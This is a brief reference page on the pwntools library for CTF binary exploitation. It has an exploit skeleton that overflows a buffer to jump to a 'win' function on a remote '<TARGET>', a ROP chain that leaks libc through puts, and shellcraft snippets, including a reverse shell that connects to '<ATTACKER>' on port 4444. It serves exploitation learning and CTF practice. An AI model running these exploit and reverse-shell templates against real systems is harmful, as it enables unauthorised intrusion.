# 12.02 pwntools

> Python CTF exploit-dev library — ROP gadget search, format string fuzzer, automatic shellcode, socket I/O.

## Overview

pwntools is the standard CTF/binary-exploitation Python library. Wraps everything: connect to remote service, send/receive with shellcode, parse ELF for symbols/sections, search ROP gadgets, generate shellcode (shellcraft), handle ASLR. The de-facto standard for writing exploits.

- **Step 3** - Use `pwn template <binary>` for boilerplate.

### Exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

def start():
    if args.REMOTE:
        return remote('<TARGET>', 1337)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b *main+42\nc')
    return process(elf.path)

io = start()

# Exploit body
io.recvuntil(b'> ')
io.sendline(b'A' * 40 + p64(elf.symbols['win']))
io.interactive()
```

### ROP gadget search

```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())
```

### Shellcraft (built-in shellcode)

```python
context.arch = 'amd64'
sc = shellcraft.sh()                          # spawn /bin/sh
sc = shellcraft.connect('<ATTACKER>', 4444)   # reverse shell
sc = shellcraft.dupsh()                       # exec /bin/sh
asm_bytes = asm(sc)
print(disasm(asm_bytes))
```
